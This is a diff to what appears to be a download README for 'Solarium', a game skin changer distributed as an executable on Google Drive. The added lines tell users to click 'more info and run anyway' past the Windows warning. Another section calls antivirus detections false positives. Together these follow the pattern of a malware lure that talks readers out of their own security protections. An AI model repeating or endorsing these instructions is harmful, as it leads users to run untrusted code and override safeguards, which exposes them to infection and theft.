@@ -3,6 +3,9 @@ Solarium is a client sided skin changer that you can use without risking a ban f
 
 # ➡️ Download
 [![Download](https://img.shields.io/badge/Download-Solarium-purple)](https://drive.google.com/file/d/1IHyAYAVTjjJg73XG5YUB8geQ-x_oCwwn/view?usp=drive_link)
+when launching solarium.exe click more info and run anyway
+![Alt text](https://www.redcort.com/assets/imgs/pages/blog/2018/windows-defender.png)
+
 
 # 🛡️ Why does my anti virus recognizes it as a malware?
 Windows Defender (and other antivirus programs) sometimes flag legitimate programs as viruses - this is called a "false positive." It doesn't necessarily mean that the program you've installed is dangerous, but rather that Windows Defender's automated systems have mistakenly identified it as suspicious.
